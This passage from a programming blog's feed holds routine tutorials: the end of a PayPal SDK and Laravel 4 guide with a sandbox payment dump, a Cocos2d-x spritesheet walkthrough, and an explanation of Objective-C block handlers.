class="number">2</span></span><br><span class="line">                                                                        )</span><br><span class="line"></span><br><span class="line">                                                                )</span><br><span class="line"></span><br><span class="line">                                                            [<span class="number">1</span>] =&gt; PayPal\Api\Item <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                                (</span><br><span class="line">                                                                    [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                                        (</span><br><span class="line">                                                                            [name] =&gt; Item <span class="number">2</span></span><br><span class="line">                                                                            [price] =&gt; <span class="number">7.00</span></span><br><span class="line">                                                                            [currency] =&gt; USD</span><br><span class="line">                                                                            [quantity] =&gt; <span class="number">4</span></span><br><span class="line">                                                                        )</span><br><span class="line"></span><br><span class="line">                                                                )</span><br><span class="line"></span><br><span class="line">                                                            [<span class="number">2</span>] =&gt; PayPal\Api\Item <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                                (</span><br><span class="line">                                                                    [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                                        (</span><br><span class="line">                                                                            [name] =&gt; Item <span class="number">3</span></span><br><span class="line">                                                                            [price] =&gt; <span class="number">20.00</span></span><br><span class="line">                                                                            [currency] =&gt; USD</span><br><span class="line">                                                                            [quantity] =&gt; <span class="number">1</span></span><br><span class="line">                                                                        )</span><br><span class="line"></span><br><span class="line">                                                                )</span><br><span class="line"></span><br><span class="line">                                                        )</span><br><span class="line"></span><br><span class="line">                                                    [shipping_address] =&gt; PayPal\Api\ShippingAddress <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                        (</span><br><span class="line">                                                            [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                                (</span><br><span class="line">                                                                    [recipient_name] =&gt; </span><br><span class="line">                                                                    [line1] =&gt; <span class="number">1</span> Main Terrace</span><br><span class="line">                                                                    [line2] =&gt; </span><br><span class="line">                                                                    [city] =&gt; Wolverhampton</span><br><span class="line">                                                                    [state] =&gt; West Midlands</span><br><span class="line">                                                                    [postal_code] =&gt; W12 <span class="number">4</span>LQ</span><br><span class="line">                                                                    [country_code] =&gt; GB</span><br><span class="line">                                                                )</span><br><span class="line"></span><br><span class="line">                                                        )</span><br><span class="line"></span><br><span class="line">                                                )</span><br><span class="line"></span><br><span class="line">                                        )</span><br><span class="line"></span><br><span class="line">                                    [related_resources] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [<span class="number">0</span>] =&gt; PayPal\Api\RelatedResources <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                (</span><br><span class="line">                                                    [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                        (</span><br><span class="line">                                                            [sale] =&gt; PayPal\Api\Sale <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                                (</span><br><span class="line">                                                                    [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                                        (</span><br><span class="line">                                                                            [id] =&gt; <span class="number">48629238</span>J1664492L</span><br><span class="line">                                                                            [create_time] =&gt; <span class="number">2014</span>-<span class="number">09</span>-<span class="number">19</span><span class="attr">T02</span>:<span class="number">47</span>:<span class="number">25</span>Z</span><br><span class="line">                                                                            [update_time] =&gt; <span class="number">2014</span>-<span class="number">09</span>-<span class="number">19</span><span class="attr">T02</span>:<span class="number">53</span>:<span class="number">55</span>Z</span><br><span class="line">                                                                            [amount] =&gt; PayPal\Api\Amount <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                                                (</span><br><span class="line">                                                                                    [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                                                        (</span><br><span class="line">                                                                                            [total] =&gt; <span class="number">78.00</span></span><br><span class="line">                                                                                            [currency] =&gt; USD</span><br><span class="line">                                                                                        )</span><br><span class="line"></span><br><span class="line">                                                                                )</span><br><span class="line"></span><br><span class="line">                                                                            [payment_mode] =&gt; INSTANT_TRANSFER</span><br><span class="line">                                                                            [state] =&gt; completed</span><br><span class="line">                                                                            [protection_eligibility] =&gt; ELIGIBLE</span><br><span class="line">                                                                            [protection_eligibility_type] =&gt; ITEM_NOT_RECEIVED_ELIGIBLE,UNAUTHORIZED_PAYMENT_ELIGIBLE</span><br><span class="line">                                                                            [parent_payment] =&gt; PAY-<span class="number">24</span>J48306WV121522LKQNZSPI</span><br><span class="line">                                                                            [links] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                                                (</span><br><span class="line">                                                                                    [<span class="number">0</span>] =&gt; PayPal\Api\Links <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                                                        (</span><br><span class="line">                                                                                            [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                                                                (</span><br><span class="line">                                                                                                    [href] =&gt; <span class="attr">https</span>://api.sandbox.paypal.com/v1/payments/sale/<span class="number">48629238</span>J1664492L</span><br><span class="line">                                                                                                    [rel] =&gt; <span class="built_in">self</span></span><br><span class="line">                                                                                                    [method] =&gt; GET</span><br><span class="line">                                                                                                )</span><br><span class="line"></span><br><span class="line">                                                                                        )</span><br><span class="line"></span><br><span class="line">                                                                                    [<span class="number">1</span>] =&gt; PayPal\Api\Links <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                                                        (</span><br><span class="line">                                                                                            [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                                                                (</span><br><span class="line">                                                                                                    [href] =&gt; <span class="attr">https</span>://api.sandbox.paypal.com/v1/payments/sale/<span class="number">48629238</span>J1664492L/refund</span><br><span class="line">                                                                                                    [rel] =&gt; refund</span><br><span class="line">                                                                                                    [method] =&gt; POST</span><br><span class="line">                                                                                                )</span><br><span class="line"></span><br><span class="line">                                                                                        )</span><br><span class="line"></span><br><span class="line">                                                                                    [<span class="number">2</span>] =&gt; PayPal\Api\Links <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                                                        (</span><br><span class="line">                                                                                            [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                                                                (</span><br><span class="line">                                                                                                    [href] =&gt; <span class="attr">https</span>://api.sandbox.paypal.com/v1/payments/payment/PAY-<span class="number">24</span>J48306WV121522LKQNZSPI</span><br><span class="line">                                                                                                    [rel] =&gt; parent_payment</span><br><span class="line">                                                                                                    [method] =&gt; GET</span><br><span class="line">                                                                                                )</span><br><span class="line"></span><br><span class="line">                                                                                        )</span><br><span class="line"></span><br><span class="line">                                                                                )</span><br><span class="line"></span><br><span class="line">                                                                        )</span><br><span class="line"></span><br><span class="line">                                                                )</span><br><span class="line"></span><br><span class="line">                                                        )</span><br><span class="line"></span><br><span class="line">                                                )</span><br><span class="line"></span><br><span class="line">                                        )</span><br><span class="line"></span><br><span class="line">                                )</span><br><span class="line"></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [links] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">0</span>] =&gt; PayPal\Api\Links <span class="title function_ invoke__">Object</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                (</span><br><span class="line">                                    [href] =&gt; <span class="attr">https</span>://api.sandbox.paypal.com/v1/payments/payment/PAY-<span class="number">24</span>J48306WV121522LKQNZSPI</span><br><span class="line">                                    [rel] =&gt; <span class="built_in">self</span></span><br><span class="line">                                    [method] =&gt; GET</span><br><span class="line">                                )</span><br><span class="line"></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>You have done.</p><h2 id="Update-Dec-17-2014"><a href="#Update-Dec-17-2014" class="headerlink" title="Update Dec 17, 2014"></a>Update Dec 17, 2014</h2><p>If you have problem with live credentials, please read through this section</p><h3 id="1-Login-to-PayPal-developer-portal"><a href="#1-Login-to-PayPal-developer-portal" class="headerlink" title="1. Login to PayPal developer portal"></a>1. Login to PayPal developer portal</h3><p><img src="/images/posts/2014-09-19-integrate-paypal-sdk-into-laravel-4/get-credential-1.png" alt="PayPal credential step 1"></p><p>Click on <strong>Dashboard</strong> link</p><h3 id="2-Edit-your-app"><a href="#2-Edit-your-app" class="headerlink" title="2. Edit your app"></a>2. Edit your app</h3><p><img src="/images/posts/2014-09-19-integrate-paypal-sdk-into-laravel-4/get-credential-2.png" alt="PayPal credential step 2"></p><p>Under <strong>My apps</strong>, click on the app you wanted to use in your project</p><h3 id="3-Get-the-live-credentials"><a href="#3-Get-the-live-credentials" class="headerlink" title="3. Get the live credentials"></a>3. Get the live credentials</h3><p><img src="/images/posts/2014-09-19-integrate-paypal-sdk-into-laravel-4/get-credential-3.png" alt="PayPal credential step 3"></p><p>Scroll down after the <strong>Add webhook</strong> button, click on the <strong>Show</strong> link</p><p><img src="/images/posts/2014-09-19-integrate-paypal-sdk-into-laravel-4/get-credential-4.png" alt="PayPal credential step 4"></p><p>Then edit <strong>app/config/paypal.php</strong>, replace <strong>client_id</strong> &amp; <strong>secret</strong> with the live credentials, and change the <strong>mode</strong> to <code>live</code></p><h4 id="Ack-Thanks-waiylgeek-for-the-info"><a href="#Ack-Thanks-waiylgeek-for-the-info" class="headerlink" title="Ack: Thanks waiylgeek for the info."></a>Ack: Thanks <a href="https://disqus.com/by/waiylgeek/">waiylgeek</a> for the info.</h4><h2 id="Update-Jan-19-2015-READ-ME"><a href="#Update-Jan-19-2015-READ-ME" class="headerlink" title="Update Jan 19, 2015. READ ME:"></a>Update Jan 19, 2015. READ ME:</h2><p>My intention of this post is about to share how to integrate PayPal official SDK to Laravel 4.<br>I’m not a PayPal expert here, those PayPal api, PayPal rules, etc question please refer to PayPal official website.</p><p>If you have any feedback or improvement, welcome to comment on this post, or drop me an email.</p><p>Thank you.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;PayPal has release an &lt;a href=&quot;https://github.com/paypal/rest-api-sdk-php&quot;&gt;official SDK&lt;/a&gt; to simplify our work. Here I want to show</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Create spritesheet for Cocos2d-x using with TexturePacker</title>
    <link href="http://jslim.net/blog/2014/09/11/create-spritesheet-for-cocos2d-x-using-with-texturepacker/"/>
    <id>http://jslim.net/blog/2014/09/11/create-spritesheet-for-cocos2d-x-using-with-texturepacker/</id>
    <published>2014-09-11T16:17:17.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Create-spritesheet"><a href="#Create-spritesheet" class="headerlink" title="Create spritesheet"></a>Create spritesheet</h2><p><img src="/images/posts/2014-09-12-create-spritesheet-for-cocos2d-x-using-with-texturepacker/spritesheet-demo.png" alt="Select Cocos2d"></p><p>Have you seen this sort of image before? The first time I saw this I thought this is created using Photoshop, and I also<br>have no idea how to use this <em>BIG</em> image in the game.</p><p>Until… I started to look in the game development, I only know that this is actually created by <em>spritesheet</em> program/app.</p><p>Here I will be using <a href="https://www.codeandweb.com/texturepacker">TexturePacker</a>.</p><p><img src="/images/posts/2014-09-12-create-spritesheet-for-cocos2d-x-using-with-texturepacker/TP_logo_512.png" alt="TexturePacker logo"></p><p>Why? I have seen many game tutorials are talking about this, I tried it and found that it is very easy to use.</p><h3 id="How-to-use-demo"><a href="#How-to-use-demo" class="headerlink" title="How to use demo"></a>How to use demo</h3><p><img src="/images/posts/2014-09-12-create-spritesheet-for-cocos2d-x-using-with-texturepacker/texturepacker-start.png" alt="Select Cocos2d"></p><p>First of all, I’m going to do this in Cocos2d-x engine, so select <strong>Cocos2d</strong> here.</p><p><img src="/images/posts/2014-09-12-create-spritesheet-for-cocos2d-x-using-with-texturepacker/texturepacker-drag.png" alt="Drag images to here"></p><p>Now, drag images to the <em>box</em></p><p><img src="/images/posts/2014-09-12-create-spritesheet-for-cocos2d-x-using-with-texturepacker/texturepacker-merged.png" alt="Drag done"></p><p>Here I drag 3 bird images, and you can see the left pane, there are <code>hero_01.png</code>, <code>hero_02.png</code>, <code>hero_03.png</code>, these are the original<br>file name.</p><p>Once you’ve done, select <strong>Publish sprite sheet</strong></p><p><img src="/images/posts/2014-09-12-create-spritesheet-for-cocos2d-x-using-with-texturepacker/publish-step-1.png" alt="Publish spritesheet 1"></p><p>It will prompt you twice, one is to save the plist file contains the meta data of the original images such as<br><code>frame</code>, <code>offset</code>, <code>rotated</code>, etc. It may sound complicated, but no worry, Cocos2d-x will handle it.</p><p><img src="/images/posts/2014-09-12-create-spritesheet-for-cocos2d-x-using-with-texturepacker/publish-step-2.png" alt="Publish spritesheet 2"></p><p>The second prompt is to save the merged image.</p><p><img src="/images/posts/2014-09-12-create-spritesheet-for-cocos2d-x-using-with-texturepacker/publish-step-done.png" alt="Publish spritesheet done"></p><p>And you’ve done.</p><h2 id="Use-in-Cocos2d-x"><a href="#Use-in-Cocos2d-x" class="headerlink" title="Use in Cocos2d-x"></a>Use in Cocos2d-x</h2><p><img src="/images/posts/2014-09-12-create-spritesheet-for-cocos2d-x-using-with-texturepacker/file-structure.png" alt="File structure"></p><p>File structure</p><p>In <strong>AppDelegate.cpp</strong> <code>applicationDidFinishLaunching()</code> method, add</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. fix the resolution</span></span><br><span class="line">glview-&gt;<span class="built_in">setDesignResolutionSize</span>(<span class="number">320</span>, <span class="number">480</span>, ResolutionPolicy::EXACT_FIT);</span><br><span class="line">director-&gt;<span class="built_in">setContentScaleFactor</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. add search path for images</span></span><br><span class="line">std::vector&lt;std::string&gt; searchPaths;</span><br><span class="line"></span><br><span class="line">searchPaths.<span class="built_in">push_back</span>(<span class="string">&quot;images&quot;</span>);</span><br><span class="line">FileUtils::<span class="built_in">getInstance</span>()-&gt;<span class="built_in">setSearchPaths</span>(searchPaths);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. add sprite frame</span></span><br><span class="line">SpriteFrameCache::<span class="built_in">getInstance</span>()-&gt;<span class="built_in">addSpriteFramesWithFile</span>(<span class="string">&quot;hero.plist&quot;</span>, <span class="string">&quot;hero.png&quot;</span>);</span><br><span class="line">SpriteFrameCache::<span class="built_in">getInstance</span>()-&gt;<span class="built_in">addSpriteFramesWithFile</span>(<span class="string">&quot;images.plist&quot;</span>, <span class="string">&quot;images.png&quot;</span>);</span><br></pre></td></tr></table></figure><ol><li>I’m a iPhone user, thus I fix the resolution to <em>320 x 480</em> for simplicity</li><li>In this case, I put the sprite sheet under <strong>images</strong> directory, thus I add the search path <code>images</code> to <code>FileUtils</code></li><li>Add sprite sheet to cache</li></ol><h3 id="Create-a-sprite-object-bird-in-this-case"><a href="#Create-a-sprite-object-bird-in-this-case" class="headerlink" title="Create a sprite object (bird in this case)"></a>Create a sprite object (bird in this case)</h3><p>I just name it <code>Hero</code>. Edit <strong>Hero.h</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __HERO_SCENE_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HERO_SCENE_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cocos2d.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span> : <span class="keyword">public</span> cocos2d::Sprite</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Hero</span>();</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">cocos2d::RepeatForever *<span class="title">moving</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// __HERO_SCENE_H__</span></span></span><br></pre></td></tr></table></figure><p>and <strong>Hero.cpp</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Hero.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;GameScene.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">USING_NS_CC;</span><br><span class="line"></span><br><span class="line">Hero::<span class="built_in">Hero</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1. load a default image</span></span><br><span class="line">    <span class="built_in">initWithSpriteFrameName</span>(<span class="string">&quot;hero_01.png&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. run the move action</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;<span class="built_in">runAction</span>(<span class="built_in">moving</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">RepeatForever* <span class="title">Hero::moving</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 3. repeat the frame</span></span><br><span class="line">    <span class="type">int</span> numFrame = <span class="number">3</span>;</span><br><span class="line">    </span><br><span class="line">    cocos2d::Vector&lt;cocos2d::SpriteFrame *&gt; frames;</span><br><span class="line">    SpriteFrameCache *frameCache = SpriteFrameCache::<span class="built_in">getInstance</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> file[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numFrame; i++) &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(file, <span class="string">&quot;hero_%02d.png&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        SpriteFrame *frame = frameCache-&gt;<span class="built_in">getSpriteFrameByName</span>(file);</span><br><span class="line">        frames.<span class="built_in">pushBack</span>(frame);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Animation *animation = Animation::<span class="built_in">createWithSpriteFrames</span>(frames, <span class="number">0.3</span>);</span><br><span class="line">    Animate *animate = Animate::<span class="built_in">create</span>(animation);</span><br><span class="line">    </span><br><span class="line">    RepeatForever *repeat = RepeatForever::<span class="built_in">create</span>(animate);</span><br><span class="line">    <span class="keyword">return</span> repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Load an image for the Hero <em>(a.k.a bird)</em> by default during object instantiation</li><li>Make the bird fly by running the move action</li><li>As we know that there are 3 images on <strong>hero.plist</strong>, thus fix it to 3. Then add all<br>these 3 images <em>(get from sprite frame cache)</em> to an array, and then repeat it forever.</li></ol><h3 id="Add-hero-to-GameScene"><a href="#Add-hero-to-GameScene" class="headerlink" title="Add hero to GameScene"></a>Add hero to GameScene</h3><p>Edit <strong>GameScene.cpp</strong>, under the <code>init()</code> method, add the code below right before <code>return</code> statement</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hero *hero = <span class="keyword">new</span> <span class="built_in">Hero</span>();</span><br><span class="line">hero-&gt;<span class="built_in">setPosition</span>(<span class="built_in">Point</span>(visibleSize.width / <span class="number">2</span>, visibleSize.height / <span class="number">2</span>));</span><br><span class="line"><span class="keyword">this</span>-&gt;<span class="built_in">addChild</span>(hero);</span><br></pre></td></tr></table></figure><p>This is to instantiate a <strong>Hero</strong> object, set the position to center of screen then add to current scene.</p><p>Run it and you will get the animated bird, see screenshot below.</p><p><img src="/images/posts/2014-09-12-create-spritesheet-for-cocos2d-x-using-with-texturepacker/animated-hero.gif" alt="Animated bird"></p><p>Done.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;Create-spritesheet&quot;&gt;&lt;a href=&quot;#Create-spritesheet&quot; class=&quot;headerlink&quot; title=&quot;Create spritesheet&quot;&gt;&lt;/a&gt;Create spritesheet&lt;/h2&gt;&lt;p&gt;&lt;img</summary>
        
      
    
    
    
    
    <category term="cocos2d-x" scheme="http://jslim.net/tags/cocos2d-x/"/>
    
  </entry>
  
  <entry>
    <title>iOS - Working with block handler</title>
    <link href="http://jslim.net/blog/2014/08/29/ios-working-with-block-handler/"/>
    <id>http://jslim.net/blog/2014/08/29/ios-working-with-block-handler/</id>
    <published>2014-08-29T22:36:12.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>If you’re not new to Objective-C, then I’m pretty sure you know about delegate. Normally we use it when the <code>outerViewController</code> that want to trigger some actions when user touch a button on <code>innerViewController</code>. </p><p>A typically example will be <code>ListViewController</code> &amp; <code>DetailViewController</code>.</p><h2 id="In-delegate-way"><a href="#In-delegate-way" class="headerlink" title="In delegate way:"></a>In delegate way:</h2><p><strong>ListViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DetailViewController *controller = [[DetailViewController alloc] init];</span><br><span class="line">controller.delegate = <span class="keyword">self</span>;</span><br><span class="line">[<span class="keyword">self</span> presentViewController:controller animated:<span class="literal">YES</span> completion:<span class="literal">nil</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">- (<span class="type">void</span>)detailDelegate:(DetailViewController *)controller</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// your actions here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>DetailViewController.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">@protocol</span> <span class="title">DetailViewControllerDelegate</span> &lt;<span class="title">NSObject</span>&gt;</span></span><br><span class="line">- (<span class="type">void</span>)detailDelegate:(DetailViewController *)controller;</span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">DetailViewController</span> : <span class="title">UIViewController</span></span></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">weak</span>) <span class="type">id</span>&lt;DetailViewControllerDelegate&gt; delegate;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>So when user do anything with this <code>DetailViewController</code></p><p><strong>DetailViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)actionTouched:(<span class="built_in">UIButton</span> *)sender</span><br><span class="line">&#123;</span><br><span class="line">    [_delegate detailDelegate:<span class="keyword">self</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>let say touched a button, then invoke the delegate method, so that the<br><code>ListViewController</code> get notify from <code>DetailViewController</code>.</p><h2 id="Alternative-Using-block"><a href="#Alternative-Using-block" class="headerlink" title="Alternative: Using block"></a>Alternative: Using block</h2><p><strong>DetailViewController.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)doneSomething:(<span class="type">void</span> (^)(<span class="type">void</span>))actionHandler;</span><br></pre></td></tr></table></figure><p>Create a method signature with an empty block handler.</p><p><strong>DetailViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">DetailViewController</span> ()</span></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="type">void</span> (^done)(<span class="type">void</span>); <span class="comment">// a property for the block</span></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">- (<span class="type">void</span>)actionTouched:(<span class="type">id</span>)sender</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">self</span>.done();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)doneSomething:(<span class="type">void</span> (^)(<span class="type">void</span>))actionHandler</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">self</span>.done = actionHandler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When user touched on the button, then it invoke the <code>done</code> block, the <code>doneSomething:</code> is called by <code>ListViewController</code></p><p><strong>ListViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DetailViewController *controller = [[DetailViewController alloc] init];</span><br><span class="line">[controller doneSomething:^&#123;</span><br><span class="line">    <span class="comment">// your actions will be invoked when user touch the button on DetailViewController</span></span><br><span class="line">&#125;];</span><br><span class="line">[<span class="keyword">self</span> presentViewController:controller animated:<span class="literal">YES</span> completion:<span class="literal">nil</span>];</span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li><em><a href="https://developer.apple.com/library/ios/documentation/Cocoa/Conceptual/ProgrammingWithObjectiveC/WorkingWithBlocks/WorkingWithBlocks.html">Working with Blocks</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;If you’re not new to Objective-C, then I’m pretty sure you know about delegate. Normally we use it when the</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
    <category term="objective-c" scheme="http://jslim.net/tags/objective-c/"/>
    
  </entry>
  
  <entry>
    <title>Laravel 4 - two pagination in a single page</title>
    <link href="http://jslim.net/blog/2014/08/22/laravel-4-two-pagination-in-a-single-page/"/>
    <id>http://jslim.net/blog/2014/08/22/laravel-4-two-pagination-in-a-single-page/</id>
    <published>2014-08-22T14:27:19.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
